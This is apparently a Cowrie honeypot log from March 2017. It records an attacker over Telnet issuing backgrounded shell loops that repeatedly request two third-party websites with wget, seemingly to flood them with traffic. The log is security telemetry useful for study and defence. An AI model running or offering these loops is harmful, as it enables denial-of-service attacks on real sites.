2017-03-27T18:51:23+0000 [CowrieTelnetTransport,136446,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.bouncebackdatarecovery.com:80/ > /dev/null 2> /dev/null; done" &
2017-03-27T18:51:23+0000 [CowrieTelnetTransport,136446,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://www.bouncebackdatarecovery.com:80/ > /dev/null 2> /dev/null; done"
2017-03-27T18:51:23+0000 [CowrieTelnetTransport,136446,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://www.cycletreads.co.nz:80/ > /dev/null 2> /dev/null; done" &
2017-03-27T18:51:23+0000 [CowrieTelnetTransport,136446,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://www.cycletreads.co.nz:80/ > /dev/null 2> /dev/null; done" &
2017-03-27T18:51:23+0000 [CowrieTelnetTransport,136446,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://www.cycletreads.co.nz:80/ > /dev/null 2> /dev/null; done"
2017-03-27T18:51:23+0000 [CowrieTelnetTransport,136446,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.cycletreads.co.nz:80/ > /dev/null 2> /dev/null; done" &
2017-03-27T18:51:23+0000 [CowrieTelnetTransport,136446,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.cycletreads.co.nz:80/ > /dev/null 2> /dev/null; done" &
2017-03-27T18:51:23+0000 [CowrieTelnetTransport,136446,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://www.cycletreads.co.nz:80/ > /dev/null 2> /dev/null; done"
2017-03-27T18:51:23+0000 [CowrieTelnetTransport,136446,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://www.cycletreads.co.nz:80/ > /dev/null 2> /dev/null; done" &
2017-03-27T18:51:23+0000 [CowrieTelnetTransport,136446,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://www.cycletreads.co.nz:80/ > /dev/null 2> /dev/null; done" &
2017-03-27T18:51:23+0000 [CowrieTelnetTransport,136446,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://www.cycletreads.co.nz:80/ > /dev/null 2> /dev/null; done"
